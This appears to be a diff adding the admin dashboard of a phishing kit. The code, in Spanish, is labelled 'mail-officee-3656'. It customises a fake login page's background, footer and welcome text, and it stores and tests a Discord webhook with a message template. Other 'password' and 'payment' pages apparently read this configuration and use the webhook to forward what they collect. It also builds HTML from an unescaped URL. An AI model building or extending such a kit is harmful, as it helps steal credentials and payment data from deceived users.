+        config.loginBgColor   = DEFAULT_CFG.loginBgColor;
+        config.loginBgColorText= DEFAULT_CFG.loginBgColor;
+        config.loginBgGradient= DEFAULT_CFG.loginBgGradient;
+        config.loginBgImage   = DEFAULT_CFG.loginBgImage;
+        saveConfigToStorage();
+        document.getElementById('loginBgType').value    = config.loginBgType;
+        document.getElementById('loginBgColor').value   = config.loginBgColor;
+        document.getElementById('loginBgColorText').value=config.loginBgColor;
+        document.getElementById('loginBgGradient').value= config.loginBgGradient;
+        document.getElementById('loginBgImage').value   = config.loginBgImage;
+        updateBgTypeUI();
+        updatePreview();
+        showMsg('success', 'Fondo restablecido');
+      }
+
+      function previewBgImage() {
+        const url = document.getElementById('loginBgImage').value;
+        const preview = document.getElementById('bgPreview');
+        if (url && url.startsWith('http')) {
+          preview.innerHTML = '<img src="' + url + '" alt="preview" style="max-width:100%; max-height:80px; object-fit:contain;" onerror="this.parentElement.innerHTML=\'<span class=\\\'preview-text\\\'>Imagen no cargó</span>\'" />';
+        } else {
+          preview.innerHTML = '<span class="preview-text">Ingresa una URL válida</span>';
+        }
+      }
+
+      // ============================================================
+      //  TEXTOS FOOTER
+      // ============================================================
+      function saveFooterTexts() {
+        config.footerHelpText    = document.getElementById('footerHelpText').value.trim()    || DEFAULT_CFG.footerHelpText;
+        config.footerTermsText   = document.getElementById('footerTermsText').value.trim()   || DEFAULT_CFG.footerTermsText;
+        config.footerPrivacyText = document.getElementById('footerPrivacyText').value.trim() || DEFAULT_CFG.footerPrivacyText;
+        config.footerNoteText    = document.getElementById('footerNoteText').value.trim()    || DEFAULT_CFG.footerNoteText;
+        saveConfigToStorage();
+        showMsg('success', 'Textos del footer guardados');
+      }
+
+      function resetFooterTexts() {
+        config.footerHelpText    = DEFAULT_CFG.footerHelpText;
+        config.footerTermsText   = DEFAULT_CFG.footerTermsText;
+        config.footerPrivacyText = DEFAULT_CFG.footerPrivacyText;
+        config.footerNoteText    = DEFAULT_CFG.footerNoteText;
+        saveConfigToStorage();
+        document.getElementById('footerHelpText').value    = config.footerHelpText;
+        document.getElementById('footerTermsText').value   = config.footerTermsText;
+        document.getElementById('footerPrivacyText').value = config.footerPrivacyText;
+        document.getElementById('footerNoteText').value    = config.footerNoteText;
+        showMsg('success', 'Textos restablecidos');
+      }
+
+      // ============================================================
+      //  VISTA PREVIA EN VIVO
+      // ============================================================
+      function updatePreview() {
+        document.getElementById('previewTitleEl').textContent    = config.appTitle;
+        document.getElementById('previewSubtitleEl').textContent = config.appSubtitle;
+      }
+
+      // ============================================================
+      //  DISCORD
+      // ============================================================
+      function saveDiscord() {
+        config.discordWebhook = document.getElementById('discordWebhook').value.trim();
+        saveConfigToStorage();
+        updateDiscordStatusBadge();
+        showMsg('success', 'Webhook guardado');
+      }
+
+      function testDiscordWebhook() {
+        const webhook = document.getElementById('discordWebhook').value.trim();
+        const successEl = document.getElementById('discordTestSuccess');
+        const errorEl   = document.getElementById('discordTestError');
+        successEl.style.display = 'none';
+        errorEl.style.display   = 'none';
+
+        if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+          errorEl.textContent = 'URL de webhook inválida';
+          errorEl.style.display = 'block';
+          return;
+        }
+
+        const testMsg = {
+          content: '🧪 Prueba de conexión — mail-officee-3656\n' +
+            'Webhook funciona correctamente.\n' +
+            'Hora: ' + new Date().toISOString()
+        };
+
+        fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(testMsg),
+        })
+        .then(r => {
+          if (r.ok) {
+            successEl.textContent = '✅ Mensaje de prueba enviado correctamente';
+            successEl.style.display = 'block';
+            document.getElementById('discordLastTest').textContent =
+              'Última prueba: ' + new Date().toLocaleString('es-CL');
+          } else {
+            errorEl.textContent = '❌ Error: ' + r.status + ' ' + r.statusText;
+            errorEl.style.display = 'block';
+          }
+        })
+        .catch(e => {
+          errorEl.textContent = '❌ Error de red: ' + e.message;
+          errorEl.style.display = 'block';
+        });
+      }
+
+      function saveTemplate() {
+        config.discordMessageTemplate = document.getElementById('discordMessageTemplate').value;
+        saveConfigToStorage();
+        showMsg('success', 'Plantilla guardada');
+      }
+
+      function resetTemplate() {
+        config.discordMessageTemplate = DEFAULT_CFG.discordMessageTemplate;
+        document.getElementById('discordMessageTemplate').value = '';
+        saveConfigToStorage();
+        showMsg('success', 'Plantilla restablecida');
+      }
+
+      function updateDiscordStatusBadge() {
+        const badge   = document.getElementById('discordStatusBadge');
+        const dot     = badge.querySelector('.badge-dot');
+        const text    = document.getElementById('discordStatusText');
+        const webhook = config.discordWebhook;
+
+        if (!webhook) {
+          badge.className = 'badge badge-warning';
+          dot.style.background = '#854d0e';
+          text.textContent = 'Sin webhook configurado';
+          return;
+        }
+        if (!webhook.includes('discord.com/api/webhooks')) {
+          badge.className = 'badge badge-error';
+          dot.style.background = '#991b1b';
+          text.textContent = 'Webhook inválido';
+          return;
+        }
+        badge.className = 'badge badge-success';
+        dot.style.background = '#166534';
+        text.textContent = 'Webhook configurado correctamente';
+      }
+
+      function checkConnection() {
+        const badge = document.getElementById('connectionBadge');
+        const dot   = badge.querySelector('.badge-dot');
+        const testUrl = window.location.origin + '/api/config';
+        fetch(testUrl, { method: 'GET' })
+          .then(r => {
+            if (r.ok) {
+              badge.className = 'badge badge-success';
+              dot.style.background = '#166534';
+              badge.innerHTML = '<span class="badge-dot" style="width:7px;height:7px;background:#166534;border-radius:50%;"></span> API conectada';
+            } else {
+              badge.className = 'badge badge-warning';
+              dot.style.background = '#854d0e';
+              badge.innerHTML = '<span class="badge-dot" style="width:7px;height:7px;background:#854d0e;border-radius:50%;"></span> API Offline (mock)';
+            }
+          })
+          .catch(() => {
+            badge.className = 'badge badge-warning';
+            dot.style.background = '#854d0e';
+            badge.innerHTML = '<span class="badge-dot" style="width:7px;height:7px;background:#854d0e;border-radius:50%;"></span> Modo local';
+          });
+      }
+
+      // ============================================================
+      //  CONTENIDO
+      // ============================================================
+      function saveContent() {
+        config.logoContent   = document.getElementById('logoContent').value.trim();
+        config.welcomeText   = document.getElementById('welcomeText').value.trim() || DEFAULT_CFG.welcomeText;
+        saveConfigToStorage();
+        showMsg('success', 'Contenido guardado');
+      }
+
+      function resetContent() {
+        config.logoContent = DEFAULT_CFG.logoContent;
+        config.welcomeText = DEFAULT_CFG.welcomeText;
+        saveConfigToStorage();
+        document.getElementById('logoContent').value = config.logoContent;
+        document.getElementById('welcomeText').value = config.welcomeText;
+        showMsg('success', 'Contenido restablecido');
+      }
+
+      // ============================================================
+      //  AJUSTES
+      // ============================================================
+      function saveSettings() {
+        config.adminTapNotes  = document.getElementById('adminTapNotes').value;
+        config.configVersion  = document.getElementById('configVersion').value || '1';
+        saveConfigToStorage();
+        showMsg('success', 'Ajustes guardados');
+      }
+
+      function resetAllSettings() {
+        if (!confirm('¿Restablecer TODOS los ajustes a sus valores predeterminados?')) return;
+        config = { ...DEFAULT_CFG };
+        saveConfigToStorage();
+        initDashboard();
+        showMsg('success', 'Todos los ajustes restablecidos');
+      }
+
+      // ============================================================
+      //  MENSAJES
+      // ============================================================
+      function showMsg(type, msg) {
+        const el = type === 'success' ? document.getElementById('msgSuccess')
+                                       : document.getElementById('msgError');
+        if (!el) return;
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(() => el.classList.remove('show'), 3000);
+      }
+
+      // ============================================================
+      //  SYNC CON LOCALSTORAGE (index/password/payment)
+      // ============================================================
+      // Cuando se guarda algo aquí, las otras páginas lo leen del localStorage.
+      // La función saveConfigToStorage() ya hace eso.
+
+      // ============================================================
+      //  INICIALIZAR AL CARGAR (si ya hay sesión activa)
+      // ============================================================
+      // Verificar si la overlay debe mostrarse o no
+      // Se muestra siempre al cargar dashboard.html directamente
+      // A menos que venga de payment con credencial válida (caso raro)
+
+      // Si se cierra y se vuelve a abrir, mostrar overlay de clave
+      // (el adminKeyOverlay es visible por defecto en el HTML)
+    </script>
+  </body>
+</html>
